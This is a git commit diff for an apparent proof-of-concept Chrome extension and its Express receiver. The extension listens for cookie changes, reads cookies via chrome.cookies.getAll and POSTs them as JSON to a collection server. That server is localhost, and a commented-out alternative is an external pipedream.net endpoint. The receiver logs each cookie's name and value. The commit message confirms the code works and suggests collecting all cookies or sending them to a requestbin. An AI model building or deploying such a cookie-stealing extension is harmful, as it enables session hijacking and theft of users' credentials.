5968f20976f3aa94d9c080e31a9c05fdd1a88fba
Razin Idzuddin <razin99@gmail.com>
2021-04-05 22:19:10 +1000

    Works, it console logs the cookies for localhost. Alternatively, you could swap it with some 'requestbin'. You could also change to cookies.getAll to well, get all cookies.

--- background.js
+++ background.js
@@ -1,13 +1,22 @@
-setTimeout(() => {
-    logCookie();
-}, 5000);
+// setTimeout(() => {
+//   logCookie();
+// }, 5000);
 
 chrome.cookies.onChanged.addListener(() => {
   logCookie();
 });
 
 function logCookie() {
-  chrome.cookies.getAll({}, (r) => {
+  chrome.cookies.getAll({ name: "secret" }, (r) => {
+    // chrome.cookies.getAll({}, (r) => {
     console.log(r);
+    fetch(`http://localhost:6900/`, {
+    // fetch(`https://en974z7hs59e3gc.m.pipedream.net/`, {
+      method: "POST",
+      body: JSON.stringify({ data: r }),
+      headers: {'content-type': 'application/json'},
+    }).catch((err) => {
+      console.warn(err);
+    });
   });
 }
--- receiver/index.js
+++ receiver/index.js
@@ -2,8 +2,17 @@ const express = require("express");
 const app = express();
 const port = 6900;
 
+app.use(express.json());
+
 app.get("/", (req, res) => {
   res.send(JSON.stringify(req.query));
+  console.log(req.query);
+});
+
+app.post("/", (req, res) => {
+  res.send(JSON.stringify(req.body.data));
+  let data = req.body.data[0]
+  console.log(data.name, " :", data.value);
 });
 
 app.listen(port, () => {
